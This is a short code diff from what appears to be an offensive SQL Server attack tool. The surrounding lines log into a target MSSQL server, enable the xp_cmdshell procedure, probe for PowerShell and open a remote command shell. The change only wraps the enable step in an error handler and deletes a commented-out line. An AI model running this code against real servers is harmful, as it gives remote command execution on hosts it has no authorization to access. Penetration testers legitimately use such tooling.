@@ -90,7 +90,9 @@ def deploy_hex2binary(ipaddr,port,username,password):
     mssql.connect()
     mssql.login("master", username, password)
     print_status("Enabling the xp_cmdshell stored procedure...")
-    mssql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
+    try:
+        mssql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;")
+    except: pass
     print_status("Checking if powershell is installed on the system...")
     # just throw a simple command via powershell to get the output
     mssql.sql_query("exec master..xp_cmdshell 'powershell -Version'")
@@ -294,7 +296,6 @@ def cmdshell(ipaddr,port,username,password,option):
     mssql = tds.MSSQL(ipaddr, int(port))
     mssql.connect()
     mssql.login("master", username, password)
-    #mssql = _mssql.connect(ipaddr + ":" + str(port), username, password)
     print_status("Connection established with SQL Server...")
     print_status("Attempting to re-enable xp_cmdshell if disabled...")
     try:
